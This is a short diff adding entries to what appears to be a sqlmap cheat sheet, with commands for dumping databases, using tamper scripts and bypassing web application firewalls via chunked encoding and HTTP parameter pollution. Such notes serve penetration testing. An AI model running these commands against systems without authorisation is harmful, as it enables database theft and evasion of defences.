@@ -170,6 +170,11 @@ sqlmap -r req.txt --batch --dump --mobile
 sqlmap --list-tampers
 sqlmap -r req.txt --tamper=between,randomcase
 
+# Bypass WAF:
+## Misc. - Chunked transfer encoding + HTTP parameter pollution (HPP)
+sqlmap -r req.txt --chunked
+sqlmap -r req.txt --hpp
+
 # Skip sqlmap WAF detection to produce less noise
 sqlmap -r req.txt --skip-waf
 
